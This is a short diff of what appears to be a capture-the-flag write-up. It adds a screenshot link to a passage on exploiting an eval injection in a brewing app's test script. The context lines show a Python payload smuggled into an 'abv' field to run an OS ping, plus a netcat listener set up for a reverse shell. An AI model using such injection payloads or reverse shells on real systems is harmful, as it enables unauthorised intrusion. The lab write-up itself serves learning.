@@ -124,6 +124,7 @@ Having downloaded the repo earlier, I can copy and modify the `tests.py` script 
 ```python
 brew_dict['abv'] = '__import__(\"os\").system(\"ping \-c 2 10.10.14.2\") # Works!!
 ```
+![Screenshot from 2019-08-02 21-03-10](https://user-images.githubusercontent.com/46615118/62841007-6b0ac780-bc68-11e9-965d-41f264d4fd0b.png)
 
 Awesome! Now let's try a reverse shell. After trying a few things, I set up a netcat listner on port `10000/tcp` (`nc -nlvp 10000`) and fed the following to the `eval` function:
 
